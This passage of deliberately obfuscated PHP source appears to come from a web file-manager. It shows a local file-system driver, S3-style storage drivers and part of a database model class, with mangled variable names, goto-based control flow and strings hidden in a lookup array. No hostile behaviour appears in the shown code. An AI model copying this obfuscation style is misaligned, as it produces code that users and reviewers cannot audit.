$Ë›µ±º = array_slice($Ë›µ±º, $€ÉÏ³Å * 0.5, $€ÉÏ³Å); } $Ë›µ±º[] = $Ï°§«¬æ; write_log($ú±ÌŞš’[176] . ACTION . $ú±ÌŞš’[1265] . $Ï°§«¬æ, $ú±ÌŞš’[1266]); } public static function getLastError($Ûùİò˜ñ = '') { $Í®Ï¨ = self::errorTips(-1); return $Í®Ï¨ ? $Í®Ï¨ : $Ûùİò˜ñ; } } goto BùÙ…î¥; Fê‡¥ˆáóµ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ö‰î€†ß) { if (substr($ö‰î€†ß, 0, 2) == $_SERVER[ÔÕ±ĞšÎ][1413]) { $ö‰î€†ß = BASIC_PATH . substr($ö‰î€†ß, 2); } return $ö‰î€†ß; } public function iconvApp($õ…ÆÅËÜ) { $Ô£½ÛÅê =& $_SERVER[ÔÕ±ĞšÎ]; global $config; return $this->iconvTo($õ…ÆÅËÜ, $config[$Ô£½ÛÅê[1442]], $config[$Ô£½ÛÅê[1441]]); } public function iconvSystem($š÷èªÛí) { $¡öœÕ› =& $_SERVER[ÔÕ±ĞšÎ]; global $config; return $this->iconvTo($š÷èªÛí, $config[$¡öœÕ›[1441]], $config[$¡öœÕ›[1442]]); } public function getPathOuter($âÈ¥Òº©) { $•†êùÚ· =& $_SERVER[ÔÕ±ĞšÎ]; $§™³Ó†î = $this->iconvApp($this->pathBase); $âÈ¥Òº© = $this->iconvApp($âÈ¥Òº©); if (substr($§™³Ó†î, 0, 2) == $•†êùÚ·[1413]) { $§™³Ó†î = BASIC_PATH . substr($§™³Ó†î, 2); } if (substr($âÈ¥Òº©, 0, 2) == $•†êùÚ·[1413]) { $âÈ¥Òº© = BASIC_PATH . substr($âÈ¥Òº©, 2); } $§™³Ó†î = KodIO::clear($§™³Ó†î); $âÈ¥Òº© = KodIO::clear($âÈ¥Òº©); $âÈ¥Òº© = substr($âÈ¥Òº©, strlen($§™³Ó†î)); if (empty($this->pathDriver)) { return $âÈ¥Òº©; } return $this->pathDriver . $•†êùÚ·[8] . ltrim($âÈ¥Òº©, $•†êùÚ·[8]); } public function mkfile($‡êÎß‰ô, $ÊòÁô¬ğ = '', $Øš¬İáÛ = REPEAT_RENAME) { $‡êÎß‰ô = $this->iconvSystem($‡êÎß‰ô); @touch($‡êÎß‰ô); if ($ÊòÁô¬ğ) { file_put_contents($‡êÎß‰ô, $ÊòÁô¬ğ); } @chmod($‡êÎß‰ô, $this->pathAuth); if (is_file($‡êÎß‰ô)) { return $this->getPathOuter($‡êÎß‰ô); } $this->writeLog(__FUNCTION__ . $_SERVER[ÔÕ±ĞšÎ][1453], !0); return !1; } public function mkdir($æñ½±Öù, $’×ø¦ò = REPEAT_SKIP) { $æñ½±Öù = $this->iconvSystem($æñ½±Öù); if (is_dir($æñ½±Öù)) { return $this->getPathOuter($æñ½±Öù); } @mkdir($æñ½±Öù, $this->pathAuth, !0); @chmod($æñ½±Öù, $this->pathAuth); if (is_dir($æñ½±Öù)) { return $this->getPathOuter($æñ½±Öù); } $this->writeLog(__FUNCTION__ . $_SERVER[ÔÕ±ĞšÎ][1453], !0); return !1; } public function copyFile($¬šçüâ, $â»Å¹‹) { $this->mkdir($this->pathFather($â»Å¹‹)); $¬šçüâ = $this->iconvSystem($¬šçüâ); $â»Å¹‹ = $this->iconvSystem($â»Å¹‹); $À£Šë´ğ = copy_64($¬šçüâ, $â»Å¹‹); @chmod($â»Å¹‹, $this->pathAuth); if ($À£Šë´ğ) { return $this->getPathOuter($â»Å¹‹); } $this->writeLog(__FUNCTION__ . $_SERVER[ÔÕ±ĞšÎ][1453], !0); return !1; } public function moveFile($İ²®È¡¿, $Å°ş©æˆ) { $this->mkdir($this->pathFather($Å°ş©æˆ)); $İ²®È¡¿ = $this->iconvSystem($İ²®È¡¿); $Å°ş©æˆ = $this->iconvSystem($Å°ş©æˆ); $ï¸şæ¿  = intval(@rename($İ²®È¡¿, $Å°ş©æˆ)); if (!$ï¸şæ¿ ) { if ($ï¸şæ¿  = intval(@copy_64($İ²®È¡¿, $Å°ş©æˆ))) { @unlink($İ²®È¡¿); } } @chmod($Å°ş©æˆ, $this->pathAuth); if ($ï¸şæ¿ ) { return $this->getPathOuter($Å°ş©æˆ); } $this->writeLog(__FUNCTION__ . $_SERVER[ÔÕ±ĞšÎ][1453], !0); return !1; } public function movePath($³öº”ãÜ, $Ï­í„‚·, $ŠÓˆš±Á = false) { $êí‹—ï¾ =& $_SERVER[ÔÕ±ĞšÎ]; $³öº”ãÜ = $this->iconvSystem($³öº”ãÜ); $Ï­í„‚· = $this->iconvSystem($Ï­í„‚·); $Öê¬­Ë = rtrim($Ï­í„‚·, $êí‹—ï¾[8]) . $êí‹—ï¾[8] . ($ŠÓˆš±Á ? $ŠÓˆš±Á : get_path_this($³öº”ãÜ)); if (file_exists($Öê¬­Ë)) { return !1; } $—¶÷•’à = intval(@rename($³öº”ãÜ, $Öê¬­Ë)); $—¶÷•’à = file_exists($Öê¬­Ë); if ($—¶÷•’à) { return $this->getPathOuter($Öê¬­Ë); } $this->writeLog(__FUNCTION__ . $êí‹—ï¾[1453], !0); return !1; } public function delFile($ÂìØ‚ª) { $ÂìØ‚ª = $this->iconvSystem($ÂìØ‚ª); if (!@unlink($ÂìØ‚ª)) { @chmod($ÂìØ‚ª, $this->pathAuth); if (@unlink($ÂìØ‚ª)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[ÔÕ±ĞšÎ][1453], !0); return !1; } return !0; } public function delFolder($¸äò€ğé) { $ñõüÖÎâ =& $_SERVER[ÔÕ±ĞšÎ]; $¸äò€ğé = $this->iconvSystem($¸äò€ğé); if (!is_dir($¸äò€ğé)) { return !0; } if (!($Ğˆ£Ë· = opendir($¸äò€ğé))) { return !1; } while (($ÂíúãÓ­ = readdir($Ğˆ£Ë·)) !== !1) { if ($ÂíúãÓ­ == $ñõüÖÎâ[10] || $ÂíúãÓ­ == $ñõüÖÎâ[1365]) { continue; } $÷í¶‹É = $¸äò€ğé . $ñõüÖÎâ[8] . $ÂíúãÓ­; if (is_file($÷í¶‹É) || is_link($÷í¶‹É)) { if (!unlink($÷í¶‹É)) { chmod($÷í¶‹É, $this->pathAuth); if (!unlink($÷í¶‹É)) { return !1; } } } else { if (is_dir($÷í¶‹É)) { chmod($÷í¶‹É, $this->pathAuth); $÷í¶‹É = $this->iconvApp($÷í¶‹É); if (!$this->delFolder($÷í¶‹É)) { return !1; } } } } closedir($Ğˆ£Ë·); return rmdir($¸äò€ğé); } public function rename($ñ‚º—”Ç, $²§Ò÷øá) { $ŠõÃü—È =& $_SERVER[ÔÕ±ĞšÎ]; $‡óìÖâ = $this->fileNameAuto($this->pathFather($ñ‚º—”Ç), $²§Ò÷øá); $‡óìÖâ = $this->iconvSystem($‡óìÖâ); $ñ‚º—”Ç = $this->iconvSystem($ñ‚º—”Ç); $ˆİ´¨ = $this->pathFather($ñ‚º—”Ç); $Äàõ¦ˆ² = rtrim($ˆİ´¨, $ŠõÃü—È[8]) . $ŠõÃü—È[8] . $‡óìÖâ; $Çë¬¸Ó = @rename($ñ‚º—”Ç, $Äàõ¦ˆ²); $Äàõ¦ˆ² = $this->iconvApp($Äàõ¦ˆ²); if ($Çë¬¸Ó) { return $this->getPathOuter($Äàõ¦ˆ²); } $this->writeLog(__FUNCTION__ . $ŠõÃü—È[1453], !0); return !1; } public function size($‡œ¢ê™) { $‡œ¢ê™ = $this->iconvSystem($‡œ¢ê™); return filesize_64($‡œ¢ê™); } public function info($¢–¼ïüÃ) { $¢–¼ïüÃ = $this->iconvSystem($¢–¼ïüÃ); if ($this->isFolder($¢–¼ïüÃ)) { return $this->folderInfo($¢–¼ïüÃ); } else { if ($this->isFile($¢–¼ïüÃ)) { return $this->fileInfo($¢–¼ïüÃ); } } return !1; } protected function infoChildren($Ú”®©ıØ, &$ÌÉ‡öÀ, $Ú°Á˜Í¨ = true) { $¬¶äÍ‡¾ =& $_SERVER[ÔÕ±ĞšÎ]; check_abort_echo(); $Ú”®©ıØ = rtrim($Ú”®©ıØ, $¬¶äÍ‡¾[8]) . $¬¶äÍ‡¾[8]; if ($Ú°Á˜Í¨) { $Ú”®©ıØ = $this->iconvSystem($Ú”®©ıØ); } if (!($–ƒè”›™ = @opendir($Ú”®©ıØ))) { return; } while (($²ñõõõø = readdir($–ƒè”›™)) !== !1) { if ($²ñõõõø == $¬¶äÍ‡¾[10] || $²ñõõõø == $¬¶äÍ‡¾[1365]) { continue; } $ÄÆÑà€Ÿ = $Ú”®©ıØ . $²ñõõõø; if (is_file($ÄÆÑà€Ÿ) || is_link($ÄÆÑà€Ÿ)) { $ÌÉ‡öÀ[$¬¶äÍ‡¾[80]]++; $ÌÉ‡öÀ[$¬¶äÍ‡¾[79]] += filesize_64($ÄÆÑà€Ÿ); } else { if (is_dir($ÄÆÑà€Ÿ)) { $ÌÉ‡öÀ[$¬¶äÍ‡¾[81]]++; $this->infoChildren($ÄÆÑà€Ÿ, $ÌÉ‡öÀ, !1); } } } closedir($–ƒè”›™); } private function folderInfo($ÌãÍø¤Á, $Ãß™ûî = false) { $¦åı•äÛ =& $_SERVER[ÔÕ±ĞšÎ]; $ÌãÍø¤Á = rtrim($ÌãÍø¤Á, $¦åı•äÛ[8]) . $¦åı•äÛ[8]; $ŸÕ¹°º = $this->iconvApp($this->pathThis($ÌãÍø¤Á)); if ($Ãß™ûî) { return array($¦åı•äÛ[32] => $ŸÕ¹°º, $¦åı•äÛ[87] => $this->getPathOuter($ÌãÍø¤Á), $¦åı•äÛ[33] => $¦åı•äÛ[78]); } $ßàÜ÷ÀÍ = array($¦åı•äÛ[32] => $ŸÕ¹°º, $¦åı•äÛ[87] => $this->getPathOuter($ÌãÍø¤Á), $¦åı•äÛ[33] => $¦åı•äÛ[78], $¦åı•äÛ[233] => @filectime($ÌãÍø¤Á), $¦åı•äÛ[88] => @filemtime($ÌãÍø¤Á), $¦åı•äÛ[1457] => @fileatime($ÌãÍø¤Á), $¦åı•äÛ[1458] => is_readable($ÌãÍø¤Á), $¦åı•äÛ[1459] => is_writable($ÌãÍø¤Á), $¦åı•äÛ[1460] => get_mode($ÌãÍø¤Á)); return $ßàÜ÷ÀÍ; } private function fileInfo($Èõäº¤², $–â›¾š’ = false) { $ùêÕ¸— =& $_SERVER[ÔÕ±ĞšÎ]; $š¡Şƒê¥ = $this->iconvApp($this->pathThis($Èõäº¤²)); if ($–â›¾š’) { return array($ùêÕ¸—[32] => $š¡Şƒê¥, $ùêÕ¸—[87] => $this->getPathOuter($Èõäº¤²), $ùêÕ¸—[33] => $ùêÕ¸—[232], $ùêÕ¸—[79] => $this->size($Èõäº¤²), $ùêÕ¸—[169] => $this->ext($š¡Şƒê¥)); } $Å»´¯¨ñ = array($ùêÕ¸—[32] => $š¡Şƒê¥, $ùêÕ¸—[87] => $this->getPathOuter($Èõäº¤²), $ùêÕ¸—[33] => $ùêÕ¸—[232], $ùêÕ¸—[233] => @filectime($Èõäº¤²), $ùêÕ¸—[88] => @filemtime($Èõäº¤²), $ùêÕ¸—[1457] => @fileatime($Èõäº¤²), $ùêÕ¸—[79] => $this->size($Èõäº¤²), $ùêÕ¸—[169] => $this->ext($š¡Şƒê¥), $ùêÕ¸—[1458] => is_readable($Èõäº¤²), $ùêÕ¸—[1459] => is_writable($Èõäº¤²), $ùêÕ¸—[1460] => get_mode($Èõäº¤²)); return $Å»´¯¨ñ; } public function exist($öèÍõ Å) { $öèÍõ Å = $this->iconvSystem($öèÍõ Å); return @file_exists($öèÍõ Å); } public function isFile($ØôÎò˜) { $ØôÎò˜ = $this->iconvSystem($ØôÎò˜); return @is_file($ØôÎò˜); } public function isFolder($¾ˆ÷“õ”) { $¾ˆ÷“õ” = $this->iconvSystem($¾ˆ÷“õ”); return @is_dir($¾ˆ÷“õ”); } public function listPath($¨œ³Èµü, $“‰£œÛ„ = false) { $¿±‰¬õÕ =& $_SERVER[ÔÕ±ĞšÎ]; $¨œ³Èµü = $this->iconvSystem($¨œ³Èµü); $¨œ³Èµü = rtrim($¨œ³Èµü, $¿±‰¬õÕ[8]) . $¿±‰¬õÕ[8]; $´ŒÚ½ö¾ = array($¿±‰¬õÕ[85] => array(), $¿±‰¬õÕ[86] => array()); if (!($ë™­ë§ = @opendir($¨œ³Èµü))) { return $´ŒÚ½ö¾; } while (($ÜÒ÷ªÕ¤ = readdir($ë™­ë§)) !== !1) { if ($ÜÒ÷ªÕ¤ == $¿±‰¬õÕ[10] || $ÜÒ÷ªÕ¤ == $¿±‰¬õÕ[1365]) { continue; } $äœ´Ì… = $¨œ³Èµü . $ÜÒ÷ªÕ¤; if (is_file($äœ´Ì…)) { $´ŒÚ½ö¾[$¿±‰¬õÕ[86]][] = $this->fileInfo($äœ´Ì…, $“‰£œÛ„); } else { $´ŒÚ½ö¾[$¿±‰¬õÕ[85]][] = $this->folderInfo($äœ´Ì…, $“‰£œÛ„); } } closedir($ë™­ë§); return $´ŒÚ½ö¾; } public function listAll($®øá â©, &$åô†êû = array()) { $¶ôÏÌõ =& $_SERVER[ÔÕ±ĞšÎ]; $®øá â© = $this->iconvSystem($®øá â©); $®øá â© = rtrim($®øá â©, $¶ôÏÌõ[8]) . $¶ôÏÌõ[8]; if (!($Ìî¯÷Ô = @opendir($®øá â©))) { return $åô†êû; } while (($Öîµ—ˆ¸ = readdir($Ìî¯÷Ô)) !== !1) { if ($Öîµ—ˆ¸ == $¶ôÏÌõ[10] || $Öîµ—ˆ¸ == $¶ôÏÌõ[1365]) { continue; } $ÂÓøÅ Â = $®øá â© . $Öîµ—ˆ¸; $Í©«Ğ†” = is_dir($ÂÓøÅ Â) && !is_link($ÂÓøÅ Â) ? 1 : 0; $ÂÓøÅ Â = $Í©«Ğ†” ? $ÂÓøÅ Â . $¶ôÏÌõ[8] : $ÂÓøÅ Â; $åô†êû[] = array($¶ôÏÌõ[87] => $ÂÓøÅ Â, $¶ôÏÌõ[78] => $Í©«Ğ†”, $¶ôÏÌõ[88] => intval(@filemtime($ÂÓøÅ Â)), $¶ôÏÌõ[79] => $Í©«Ğ†” ? 0 : intval($this->size($ÂÓøÅ Â))); if ($Í©«Ğ†”) { $this->listAll($ÂÓøÅ Â, $åô†êû); } } closedir($Ìî¯÷Ô); return $åô†êû; } public function has($š¨øô³ø, $•‘Ö†€ = false, $Şº—ì± = true) { $¤âƒÉˆ´ =& $_SERVER[ÔÕ±ĞšÎ]; $š¨øô³ø = $this->iconvSystem($š¨øô³ø); $š¨øô³ø = rtrim($š¨øô³ø, $¤âƒÉˆ´[8]) . $¤âƒÉˆ´[8]; if (!($‹Í©Ü¸ = @opendir($š¨øô³ø))) { return !1; } $´£äÍÊû = 0; $ú…®Î« = 0; $àëªŸš = 0; while (($²Àí®À˜ = readdir($‹Í©Ü¸)) !== !1) { if ($²Àí®À˜ == $¤âƒÉˆ´[10] || $²Àí®À˜ == $¤âƒÉˆ´[1365]) { continue; } $î«¤Ô¦˜ = $š¨øô³ø . $²Àí®À˜; if ($•‘Ö†€) { $àëªŸš++; if (@is_file($î«¤Ô¦˜)) { $´£äÍÊû++; } else { $ú…®Î«++; } if ($àëªŸš > 10000) { break; } continue; } if ($Şº—ì±) { if (@is_file($î«¤Ô¦˜)) { return !0; } } else { if (@is_dir($î«¤Ô¦˜ . $¤âƒÉˆ´[8])) { return !0; } } } closedir($‹Í©Ü¸); if ($•‘Ö†€) { return array($¤âƒÉˆ´[241] => $´£äÍÊû, $¤âƒÉˆ´[242] => $ú…®Î«); } return !1; } public function hashSimple($¬‡Ú·ç‡) { $ŒôôıçÛ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$¬‡Ú·ç‡) { return md5($ŒôôıçÛ[12]); } $¬‡Ú·ç‡ = $this->iconvSystem($¬‡Ú·ç‡); $ñÁ»á¦ = $this->size($¬‡Ú·ç‡); $¢ü Òö = 200; $èÀÁâ¨º = 50; if ($ñÁ»á¦ <= $¢ü Òö * $èÀÁâ¨º) { return $this->hashMd5($¬‡Ú·ç‡) . $ñÁ»á¦; } $‘Œ‡Œ¨ = $ŒôôıçÛ[12]; $àŞî÷Å = intval($ñÁ»á¦ / $èÀÁâ¨º); $÷¯ºÎš¸ = fopen($¬‡Ú·ç‡, $ŒôôıçÛ[1461]); if (!$÷¯ºÎš¸) { return $‘Œ‡Œ¨; } for ($ËÌÂêºÀ = 0; $ËÌÂêºÀ < $èÀÁâ¨º; $ËÌÂêºÀ++) { fseek_64($÷¯ºÎš¸, $àŞî÷Å * $ËÌÂêºÀ); $‘Œ‡Œ¨ .= fread($÷¯ºÎš¸, $¢ü Òö); } fseek_64($÷¯ºÎš¸, $ñÁ»á¦ - $¢ü Òö); $‘Œ‡Œ¨ .= fread($÷¯ºÎš¸, $¢ü Òö); fclose($÷¯ºÎš¸); return md5($‘Œ‡Œ¨) . $ñÁ»á¦; } public function getContent($Æ±™ÃÀú) { $Æ±™ÃÀú = $this->iconvSystem($Æ±™ÃÀú); return file_get_contents($Æ±™ÃÀú); } public function setContent($ø©ç„¥Ÿ, $Úò»üî· = '') { $ø©ç„¥Ÿ = $this->iconvSystem($ø©ç„¥Ÿ); $ÎÀÁÑÓ = @file_put_contents($ø©ç„¥Ÿ, $Úò»üî·, LOCK_EX); if (!$ÎÀÁÑÓ) { $this->writeLog(__FUNCTION__ . $_SERVER[ÔÕ±ĞšÎ][1453], !0); } clearstatcache(); @chmod($ø©ç„¥Ÿ, $this->pathAuth); return $ÎÀÁÑÓ === !1 ? !1 : !0; } public function fileSubstr($µ÷«ÙÊİ, $©æÇ›æÛ = 0, $¥«óËÏ = false) { $–¹Çò‹˜ =& $_SERVER[ÔÕ±ĞšÎ]; $µ÷«ÙÊİ = $this->iconvSystem($µ÷«ÙÊİ); if ($¥«óËÏ === !1) { $¥«óËÏ = $this->size($µ÷«ÙÊİ); } if ($¥«óËÏ <= 0) { return $–¹Çò‹˜[12]; } $Ï·ª¥ê = fopen($µ÷«ÙÊİ, $–¹Çò‹˜[1461]); if (!$Ï·ª¥ê) { return !1; } fseek_64($Ï·ª¥ê, $©æÇ›æÛ); $¸’ä¡÷œ = fread($Ï·ª¥ê, $¥«óËÏ); fclose($Ï·ª¥ê); if (!$¸’ä¡÷œ) { $this->writeLog(__FUNCTION__ . $–¹Çò‹˜[1453], !0); } return $¸’ä¡÷œ; } public function upload($÷ˆşÓ§›, $†½İ±’‰, $àºƒÓÇ® = false, $æÅÑ©ü = REPEAT_REPLACE) { if ($àºƒÓÇ®) { return $this->moveFile($†½İ±’‰, $÷ˆşÓ§›); } return $this->copyFile($†½İ±’‰, $÷ˆşÓ§›); } public function setModifyTime($§Ëñ‹¤¯, $ˆ‚­ôç¬ = '') { @touch($§Ëñ‹¤¯, intval($ˆ‚­ôç¬)); } public function download($ÓªÍ¯Ú, $Ç¡€æÜÒ) { return $this->iconvSystem($ÓªÍ¯Ú); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($×Â‚©åŠ) { parent::__construct($×Â‚©åŠ); $this->setSignVersion($_SERVER[ÔÕ±ĞšÎ][249]); } public function fileOutImage($™õ‘Ù­Š, $—î˜éÇ¸ = 250) { $ºŞ¦Ëó =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->size($™õ‘Ù­Š) > 1024 * 1024 * 25) { return $this->fileOutImageServer($™õ‘Ù­Š, $—î˜éÇ¸); } $ƒ ˜ÅÉã = array($ºŞ¦Ëó[1462] => $ºŞ¦Ëó[1463] . $—î˜éÇ¸ . $ºŞ¦Ëó[1464]); $ááÍˆ¢¬ = $this->link($™õ‘Ù­Š, $ƒ ˜ÅÉã); $this->fileOutLink($ááÍˆ¢¬); } public function fileOutLink($Ğ‰é˜ğà) { $³é¥Š± =& $_SERVER[ÔÕ±ĞšÎ]; if (substr($Ğ‰é˜ğà, 0, 7) == $³é¥Š±[218]) { $Ğ‰é˜ğà = $³é¥Š±[219] . substr($Ğ‰é˜ğà, 7); } header($³é¥Š±[175] . $Ğ‰é˜ğà); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($çØà¥Çğ) { parent::__construct($çØà¥Çğ); $this->setSignVersion($_SERVER[ÔÕ±ĞšÎ][249]); } public function fileOutLink($ç‡Ä´Â¹) { $±ØÉÃÄ =& $_SERVER[ÔÕ±ĞšÎ]; if (substr($ç‡Ä´Â¹, 0, 7) == $±ØÉÃÄ[218]) { $ç‡Ä´Â¹ = $±ØÉÃÄ[219] . substr($ç‡Ä´Â¹, 7); } header($±ØÉÃÄ[175] . $ç‡Ä´Â¹); die; } public function uploadFormData($›‚‡àä¢, $§ëÊåïò = 3600) { return $this->uploadFormDataV2($›‚‡àä¢, $§ëÊåïò); } } goto fÊÍ—Ñ­·; A×†Ë¥ïœÙ: define($_SERVER[ÔÕ±ĞšÎ][322], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\x65", "\157\162\x64\145\162", "\x61\154\x69\x61\163", "\x68\141\x76\151\x6e\147", "\147\162\x6f\165\x70", "\154\x6f\x63\x6b", "\x64\151\163\x74\x69\156\143\x74", "\x61\x75\x74\157", "\x66\x69\154\164\145\x72", "\166\x61\154\x69\x64\141\164\x65", "\x72\145\x73\165\154\x74", "\x62\x69\156\x64", "\x74\x6f\153\145\156"); public function __construct($÷ˆ×º˜ = '', $© ˆ§§ = '', $‹ïµõÂ = '') { $úÓ¸ŠÀƒ =& $_SERVER[ÔÕ±ĞšÎ]; $this->_initialize(); if (!empty($÷ˆ×º˜)) { if (strpos($÷ˆ×º˜, $úÓ¸ŠÀƒ[10])) { list($this->dbName, $this->name) = explode($úÓ¸ŠÀƒ[10], $÷ˆ×º˜); } else { $this->name = $÷ˆ×º˜; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($© ˆ§§)) { $this->tablePrefix = $úÓ¸ŠÀƒ[12]; } elseif ($úÓ¸ŠÀƒ[12] != $© ˆ§§) { $this->tablePrefix = $© ˆ§§; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($úÓ¸ŠÀƒ[323]); } $this->db(0, empty($this->connection) ? $‹ïµõÂ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Üò‚ñÀ =& $_SERVER[ÔÕ±ĞšÎ]; if (empty($this->fields)) { if (think_config($Üò‚ñÀ[324])) { $”›Ÿ˜º = $this->dbName ? $this->dbName : think_config($Üò‚ñÀ[325]); $¿Ù¹´È = think_var_cache($Üò‚ñÀ[326] . strtolower(get_path_this($”›Ÿ˜º) . $Üò‚ñÀ[10] . $this->name)); if ($¿Ù¹´È) { $©¿Çó‰¯ = think_config($Üò‚ñÀ[327]); if (empty($©¿Çó‰¯) || $¿Ù¹´È[$Üò‚ñÀ[328]] == $©¿Çó‰¯) { $this->fields = $¿Ù¹´È; return; } } } $this->flush(); } } public function flush() { $×´Õˆ³â =& $_SERVER[ÔÕ±ĞšÎ]; $this->db->setModel($this->name); $°¾Ñ’ÑÕ = $this->db->getFields($this->getTableName()); if (!$°¾Ñ’ÑÕ) { return !1; } $this->fields = array_keys($°¾Ñ’ÑÕ); $this->fields[$×´Õˆ³â[329]] = !1; foreach ($°¾Ñ’ÑÕ as $¢ûõ¿¶¸ => $Õ‹¥ù‡×) { $ùó˜²Ë‰[$¢ûõ¿¶¸] = $Õ‹¥ù‡×[$×´Õˆ³â[33]]; if ($Õ‹¥ù‡×[$×´Õˆ³â[39]]) { $this->fields[$×´Õˆ³â[330]] = $¢ûõ¿¶¸; if ($Õ‹¥ù‡×[$×´Õˆ³â[42]]) { $this->fields[$×´Õˆ³â[329]] = !0; } } } $this->fields[$×´Õˆ³â[331]] = $ùó˜²Ë‰; if (think_config($×´Õˆ³â[327])) { $this->fields[$×´Õˆ³â[328]] = think_config($×´Õˆ³â[327]); } if (think_config($×´Õˆ³â[324])) { $ô‡ğ‚ô„ = $this->dbName ? $this->dbName : think_config($×´Õˆ³â[325]); think_var_cache($×´Õˆ³â[326] . strtolower(get_path_this($ô‡ğ‚ô„) . $×´Õˆ³â[10] . $this->name), $this->fields); } } public function switchModel($¸Îˆø…€, $ã¥ššÊÚ = array()) { $šÌÅ¬õÌ =& $_SERVER[ÔÕ±ĞšÎ]; $†®‚¡¡¨ = ucwords(strtolower($¸Îˆø…€)) . $šÌÅ¬õÌ[332]; if (!class_exists($†®‚¡¡¨)) { think_exception($†®‚¡¡¨ . think_lang($šÌÅ¬õÌ[333])); } $this->_extModel = new $†®‚¡¡¨($this->name); if (!empty($ã¥ššÊÚ)) { foreach ($ã¥ššÊÚ as $¹¯ï™÷À) { $this->_extModel->setProperty($¹¯ï™÷À, $this->{$¹¯ï™÷À}); } } return $this->_extModel; } public function __set($€Å‡Ø¿‰, $ÈÚ°åµ) { $this->data[$€Å‡Ø¿‰] = $ÈÚ°åµ; } public function __get($æšßëìî) { return isset($this->data[$æšßëìî]) ? $this->data[$æšßëìî] : null; } public function __isset($ÏÌç•¥) { return isset($this->data[$ÏÌç•¥]); } public function __unset($â§Ú§§‹) { unset($this->data[$â§Ú§§‹]); } public function __call($‚Ü‹ÛÛì, $ŒºßšÇì) { $’½»£¹à =& $_SERVER[ÔÕ±ĞšÎ]; if (in_array(strtolower($‚Ü‹ÛÛì), $this->methods, !0)) { $this->options[strtolower($‚Ü‹ÛÛì)] = $ŒºßšÇì[0]; return $this; } elseif (in_array(strtolower($‚Ü‹ÛÛì), array($’½»£¹à[334], $’½»£¹à[335], $’½»£¹à[336], $’½»£¹à[337], $’½»£¹à[338]), !0)) { $÷ßÀÀ©™ = isset($ŒºßšÇì[0]) ? $ŒºßšÇì[0] : $’½»£¹à[222]; $÷ßÀÀ©™ = $this->db->parseKey($÷ßÀÀ©™); return $this->getField(strtoupper($‚Ü‹ÛÛì) . $’½»£¹à[339] . $÷ßÀÀ©™ . $’½»£¹à[340] . $‚Ü‹ÛÛì, $’½»£¹à[334]); } elseif (strtolower(substr($‚Ü‹ÛÛì, 0, 5)) == $’½»£¹à[341]) { $÷ßÀÀ©™ = think_parse_name(substr($‚Ü‹ÛÛì, 5)); $ÜÏÙø‹í[$÷ßÀÀ©™] = $ŒºßšÇì[0]; return $this->where($ÜÏÙø‹í)->find(); } elseif (strtolower(substr($‚Ü‹ÛÛì, 0, 10)) == $’½»£¹à[342]) { $æØŞÕ = think_parse_name(substr($‚Ü‹ÛÛì, 10)); $ÜÏÙø‹í[$æØŞÕ] = $ŒºßšÇì[0]; return $this->where($ÜÏÙø‹í)->getField($ŒºßšÇì[1]); } elseif (isset($this->_scope[$‚Ü‹ÛÛì])) { return $this->scope($‚Ü‹ÛÛì, $ŒºßšÇì[0]); } elseif (method_exists($this, $‚Ü‹ÛÛì)) { array_unshift($ŒºßšÇì, $‚Ü‹ÛÛì); return call_user_func_array(array($this, $’½»£¹à[343]), $ŒºßšÇì); } else { return call_user_func_array(array(parent, $‚Ü‹ÛÛì), $ŒºßšÇì); } } protected function call() { $¢‚û¦İ« =& $_SERVER[ÔÕ±ĞšÎ]; $ª—Ì€ó = func_get_args(); $§ô‡¨ = array_shift($ª—Ì€ó); $ÍÆÄ¬«é = $§ô‡¨; if (is_array($§ô‡¨)) { $ÍÆÄ¬«é = $§ô‡¨[1]; $§ô‡¨ = $§ô‡¨[0]; } $ÉÄ¸ëŠ = count($ª—Ì€ó) - 1; if (isset($ª—Ì€ó[$ÉÄ¸ëŠ]) && $ª—Ì€ó[$ÉÄ¸ëŠ] === $§ô‡¨) { think_exception(__CLASS__ . $¢‚û¦İ«[4] . $§ô‡¨ . think_lang($¢‚û¦İ«[344])); return; } $ª—Ì€ó[] = $§ô‡¨; if (method_exists($this, $¢‚û¦İ«[345])) { $í²½“’ó = call_user_func_array(array($this, $¢‚û¦İ«[346]), array($ÍÆÄ¬«é, $ª—Ì€ó)); if (!is_null($í²½“’ó) && $í²½“’ó !== !1) { return $í²½“’ó; } } $±Ìæ’ó³ = call_user_func_array(array($this, $§ô‡¨), $ª—Ì€ó); if (method_exists($this, $¢‚û¦İ«[347])) { $í²½“’ó = call_user_func_array(array($this, $¢‚û¦İ«[348]), array($ÍÆÄ¬«é, $ª—Ì€ó, $±Ìæ’ó³)); if ($í²½“’ó) { return $í²½“’ó; } } return $±Ìæ’ó³; } protected function _initialize() { } protected function _facade($èş•šÊõ) { $¨–âª¬ =& $_SERVER[ÔÕ±ĞšÎ]; if (!empty($this->fields)) { foreach ($èş•šÊõ as $ê‹ñûÌë => $»‚Â¾ñü) { if (is_array($this->fields) && !in_array($ê‹ñûÌë, $this->fields, !0)) { unset($èş•šÊõ[$ê‹ñûÌë]); } elseif (is_scalar($»‚Â¾ñü)) { $this->_parseType($èş•šÊõ, $ê‹ñûÌë); } } } if (!empty($this->options[$¨–âª¬[349]])) { $èş•šÊõ = array_map($this->options[$¨–âª¬[349]], $èş•šÊõ); unset($this->options[$¨–âª¬[349]]); } $this->_beforeWrite($èş•šÊõ); return $èş•šÊõ; } protected function _beforeWrite(&$ñ”ŒİÏİ) { } public function add($­Ü‹‹† = '', $êõ¶‚  = array(), $ïÆó”ÃŒ = false) { if (empty($­Ü‹‹†)) { if (!empty($this->data)) { $­Ü‹‹† = $this->data; $this->data = array(); } else { 